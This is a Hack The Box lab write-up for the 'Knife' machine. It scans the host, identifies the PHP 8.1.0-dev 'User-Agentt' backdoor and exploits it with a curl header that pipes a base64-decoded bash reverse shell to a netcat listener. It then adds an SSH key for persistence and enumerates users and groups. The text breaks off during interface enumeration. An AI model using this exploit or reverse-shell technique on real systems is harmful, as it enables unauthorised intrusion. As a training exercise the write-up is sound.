<!DOCTYPE html>
<html lang="en">
    <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
        <meta name="author" content="Matthieu Mezirard">
    
    <meta name="author" content="Matthieu Mezirard" />
    
        <meta name="description" content="This is an easy Linux box.">
    
    <title>
        
            
        
        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;knife#
    </title>
    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="/main.css" />
    <link
        id="theme-light-style"
        rel="stylesheet"
        type="text/css"
        href="/theme/light.css"
    />
    <link
        id="theme-dark-style"
        rel="stylesheet"
        type="text/css"
        href="/theme/dark.css"
    />
    <script
        async
        src="https://eu.umami.is/script.js"
        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
    ></script>
    <script src="/js/theme-toggle.js"></script>
    <script src="/js/code-wrapper.js"></script>
    <script src="/js/code-indicator.js"></script>
</head>


    <body>
        <header>
    <div class="left">
        <a href="/">
    mmezirard
</a>

        <div class="socials">
    
        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
            <img src="/icons/github.svg" alt="github" />
        </a>
    
        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
        </a>
    
        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
            <img src="/icons/hackerone.svg" alt="hackerone" />
        </a>
    
</div>

    </div>
    <div class="right">
        <nav>
    <ul>
        
            <li>
                <a href="&#x2F;htb-write-ups">
                    &#x2F;htb-write-ups
                </a>
            </li>
        
    </ul>
</nav>

        <button onclick="toggleTheme()">
    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
</button>
<script src="/js/theme-toggle.js"></script>

    </div>
</header>

        
    <main>
        
<article>
    <div>
        
    
        <div class="page-h1">
            Knife<span>.</span>
        </div>
    


        <div class="page-metadata">
            
                Posted on <time>2024-01-22</time>
            
        </div>

        
            <img
                class="page-cover"
                alt="cover.png"
                src="https://mmezirard.github.io/htb-write-ups/boxes/knife/cover.png"
            />
        
    </div>

    
        <h1>Table of Contents</h1>
        <ul>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#information">Information</a>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#setup">Setup</a>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#host-10-10-10-242">Host 10.10.10.242</a>
                    
                        <ul>
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#scanning">Scanning</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#ports">Ports</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#fingerprinting">Fingerprinting</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#scripts">Scripts</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#services-enumeration">Services enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#apache">Apache</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#foothold-backdoor">Foothold (Backdoor)</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#preparation">Preparation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#exploitation">Exploitation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#spawning-a-pty-establishing-persistence">Spawning a pty &amp; establishing persistence</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#getting-a-lay-of-the-land">Getting a lay of the land</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#architecture">Architecture</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#distribution">Distribution</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#kernel">Kernel</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#users">Users</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#groups">Groups</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#nics">NICs</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#hostname">Hostname</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#system-enumeration">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#flags">Flags</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#sudo-permissions">Sudo permissions</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#exploitation-1">Exploitation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#establishing-persistence">Establishing persistence</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#system-enumeration-1">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#flags-1">Flags</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                        </ul>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/knife/#afterwords">Afterwords</a>
                    
                </li>
            
        </ul>
    

    <section><h1 id="information">Information</h1>
<p><strong>Difficulty</strong>: Easy</p>
<p><strong>OS</strong>: Linux</p>
<p><strong>Release date</strong>: 2021-05-22</p>
<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/98767">MrKN16H7</a></p>
<h1 id="setup">Setup</h1>
<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
practice security-wise, but it's a VM so it's alright. This way I won't have to
prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
<p>I like to maintain consistency in my workflow for every box, so before starting
with the actual pentest, I'll prepare a few things:</p>
<ol>
<li>
<p>I'll create a directory that will contain every file related to this box.
I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
<code>/</code>.</p>
</li>
<li>
<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
files in this folder available over the Internet, which will be especially
useful for transferring files to the target machine if need be!</p>
</li>
<li>
<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
This will come in handy once we get a foothold, for privilege escalation and
for pivoting inside the internal network.</p>
</li>
</ol>
<p>I'll also strive to minimize the use of Metasploit, because it hides the
complexity of some exploits, and prefer a more manual approach when it's not too
much hassle. This way, I'll have a better understanding of the exploits I'm
running, and I'll have more control over what's happening on the machine.</p>
<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.4</code>. The
commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
need to transfer files or binaries to the target machine, I'll always place them
in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
<p>Now we should be ready to go!</p>
<h1 id="host-10-10-10-242">Host <code>10.10.10.242</code></h1>
<h2 id="scanning">Scanning</h2>
<h3 id="ports">Ports</h3>
<p>As usual, let's start by initiating a port scan on Knife using a TCP SYN <code>nmap</code>
scan to assess its attack surface.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.242<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE SERVICE
</span><span class="z-text z-plain">22/tcp open  ssh
</span><span class="z-text z-plain">80/tcp open  http
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>Let's also check the 500 most common UDP ports.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.242<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<h3 id="fingerprinting">Fingerprinting</h3>
<p>Following the ports scans, let's gather more data about the services associated
with the open TCP ports we found.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.242<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
</span><span class="z-text z-plain">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
</span><span class="z-text z-plain">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
</span><span class="z-text z-plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>Alright, so <code>nmap</code> managed to determine that Knife is running Linux, and the
version of SSH suggests that it might be Ubuntu.</p>
<h3 id="scripts">Scripts</h3>
<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
additional information.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.242<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE SERVICE
</span><span class="z-text z-plain">22/tcp open  ssh
</span><span class="z-text z-plain">| ssh-hostkey: 
</span><span class="z-text z-plain">|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
</span><span class="z-text z-plain">|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
</span><span class="z-text z-plain">|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
</span><span class="z-text z-plain">80/tcp open  http
</span><span class="z-text z-plain">|_http-title:  Emergent Medical Idea
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<h2 id="services-enumeration">Services enumeration</h2>
<h3 id="apache">Apache</h3>
<h4 id="exploration">Exploration</h4>
<p>Let's browse to <code>http://10.10.10.242/</code>.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/knife/apache-homepage.png" alt="Apache homepage" /></p>
<p>It's a website for a medical company. There's hardly more information.</p>
<h4 id="fingerprinting-1">Fingerprinting</h4>
<p>Let's fingerprint the technologies used by this web page with the
<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/knife/apache-homepage-wappalyzer.png" alt="Apache homepage Wappalyzer extension" /></p>
<p>This reveals that this web page is using PHP version <code>8.1.0</code>.</p>
<p>If we check the HTTP headers of the response, we also find a <code>X-Powered-By</code>
header specifying that it's actually PHP version <code>8.1.0-dev</code>.</p>
<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>Apache 2.4.41</code>, we
find nothing. However, if we enter <code>PHP 8.1.0-dev</code>, we find
<a href="https://www.exploit-db.com/exploits/49933">PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution</a>.</p>
<h2 id="foothold-backdoor">Foothold (Backdoor)</h2>
<p>The vulnerability affecting PHP version <code>8.1.0-dev</code> is simply a backdoor
accessible through the <code>User-agentt</code> HTTP header.</p>
<h3 id="preparation">Preparation</h3>
<p>The goal is to obtain a reverse shell.</p>
<p>First, I'll setup a listener to receive the shell.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<p>Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
<a href="https://www.revshells.com/">RevShells</a> configured to obtain a <code>/bin/bash</code>
shell.</p>
<p>I'll save it as the <code>BASE64_REVSHELL_PAYLOAD</code> shell variable.</p>
<p>According to the Python PoC we found, the <code>User-Agentt</code> value I should send to
execute this command is:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">zerodium</span></span><span class="z-meta z-function-call z-arguments z-shell"> system(<span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>/bin/echo $BASE64_REVSHELL_PAYLOAD | /usr/bin/base64 -d | /bin/bash -i<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span><span class="z-meta z-function-call z-shell"></span>)<span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
</span></code></pre>
<h3 id="exploitation">Exploitation</h3>
<p>Let's send a request with this header.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>User-Agentt: zerodium system(&#39;/bin/echo <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">BASE64_REVSHELL_PAYLOAD</span></span> | /usr/bin/base64 -d | /bin/bash -i&#39;);<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.242/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<p>If we check our listener:</p>
<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.242] 55882
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">james@knife:/$
</span></code></pre>
<p>It caught the reverse shell!</p>
<h3 id="spawning-a-pty-establishing-persistence">Spawning a pty &amp; establishing persistence</h3>
<p>Let's use SSH to spawn a pty and to establish persistence.</p>
<p>Our home folder contains a <code>.ssh</code> directory with a private key. I'll add the
corresponding public key to <code>authorized_keys</code>, and I'll connect over SSH to
Knife as <code>james</code>.</p>
<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
<p>If we run <code>whoami</code>, we see that we got a foothold as <code>james</code>.</p>
<h3 id="architecture">Architecture</h3>
<p>What is Knife's architecture?</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">james@knife:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">x86_64
</span></code></pre>
<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
<h3 id="distribution">Distribution</h3>
<p>Let's see which distribution Knife is using.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">james@knife:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/lsb-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">DISTRIB_ID=Ubuntu
</span><span class="z-text z-plain">DISTRIB_RELEASE=20.04
</span><span class="z-text z-plain">DISTRIB_CODENAME=focal
</span><span class="z-text z-plain">DISTRIB_DESCRIPTION=&quot;Ubuntu 20.04.2 LTS&quot;
</span></code></pre>
<p>Okay, so it's Ubuntu 20.04.</p>
<h3 id="kernel">Kernel</h3>
<p>Let's find the kernel version of Knife.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">james@knife:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">5.4.0-80-generic
</span></code></pre>
<p>It's <code>5.4.0</code>.</p>
<h3 id="users">Users</h3>
<p>Let's enumerate all users.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">james@knife:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">james
</span><span class="z-text z-plain">opscode-pgsql
</span><span class="z-text z-plain">root
</span></code></pre>
<p>There's <code>james</code> (us), <code>opscode-pgsql</code> and <code>root</code>.</p>
<h3 id="groups">Groups</h3>
<p>Let's enumerate all groups.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">james@knife:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">adm
</span><span class="z-text z-plain">audio
</span><span class="z-text z-plain">backup
</span><span class="z-text z-plain">bin
</span><span class="z-text z-plain">cdrom
</span><span class="z-text z-plain">crontab
</span><span class="z-text z-plain">daemon
</span><span class="z-text z-plain">dialout
</span><span class="z-text z-plain">dip
</span><span class="z-text z-plain">disk
</span><span class="z-text z-plain">fax
</span><span class="z-text z-plain">floppy
</span><span class="z-text z-plain">games
</span><span class="z-text z-plain">gnats
</span><span class="z-text z-plain">input
</span><span class="z-text z-plain">irc
</span><span class="z-text z-plain">james
</span><span class="z-text z-plain">kmem
</span><span class="z-text z-plain">kvm
</span><span class="z-text z-plain">landscape
</span><span class="z-text z-plain">list
</span><span class="z-text z-plain">lp
</span><span class="z-text z-plain">lxd
</span><span class="z-text z-plain">mail
</span><span class="z-text z-plain">man
</span><span class="z-text z-plain">messagebus
</span><span class="z-text z-plain">netdev
</span><span class="z-text z-plain">news
</span><span class="z-text z-plain">nogroup
</span><span class="z-text z-plain">operator
</span><span class="z-text z-plain">opscode
</span><span class="z-text z-plain">opscode-pgsql
</span><span class="z-text z-plain">plugdev
</span><span class="z-text z-plain">proxy
</span><span class="z-text z-plain">render
</span><span class="z-text z-plain">root
</span><span class="z-text z-plain">sasl
</span><span class="z-text z-plain">shadow
</span><span class="z-text z-plain">src
</span><span class="z-text z-plain">ssh
</span><span class="z-text z-plain">ssl-cert
</span><span class="z-text z-plain">staff
</span><span class="z-text z-plain">sudo
</span><span class="z-text z-plain">sys
</span><span class="z-text z-plain">syslog
</span><span class="z-text z-plain">systemd-coredump
</span><span class="z-text z-plain">systemd-journal
</span><span class="z-text z-plain">systemd-network
</span><span class="z-text z-plain">systemd-resolve
</span><span class="z-text z-plain">systemd-timesync
</span><span class="z-text z-plain">tape
</span><span class="z-text z-plain">tcpdump
</span><span class="z-text z-plain">tss
</span><span class="z-text z-plain">tty
</span><span class="z-text z-plain">users
</span><span class="z-text z-plain">utmp
</span><span class="z-text z-plain">uucp
</span><span class="z-text z-plain">uuidd
</span><span class="z-text z-plain">video
</span><span class="z-text z-plain">voice
</span><span class="z-text z-plain">www-data
</span></code></pre>
<p>The <code>lxd</code> group is interesting to elevate privileges.</p>
<h3 id="nics">NICs</h3>
<p>Let's gather the list of connected NICs.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">james@knife:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ifconfig</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span><span class="z-text z-plain">        inet 10.10.10.242  netmask 255.255.255.0  broadcast 10.10.10.255
</span><span class="z-text z-plain">        inet6 dead:beef::250:56ff:feb9:c33e  prefixlen 64  scopeid 0x0&lt;global&gt;
</span><span class="z-text z-plain">        inet6 fe80::250:56ff:feb9:c33e  prefixlen 64  scopeid 0x20&lt;link&gt;
</span><span class="z-text z-plain">        ether 00:50:56:b9:c3:3e  txqueuelen 1000  (Ethernet)
</span><span class="z-text z-plain">        RX packets 67101  bytes 4071299 (4.0 MB)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 67123  bytes 3865835 (3.8 MB)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
</span><span class="z-text z-plain">        inet 127.0.0.1  netmask 255.0.0.0
</span><span class="z-text z-plain">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
</span><span class="z-text z-plain">        loop  txqueuelen 1000  (Local Loopback)
</span><span class="z-text z-plain">        RX packets 24559  bytes 2706885 (2.7 MB)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 24559  bytes 2706885 (2.7 MB)
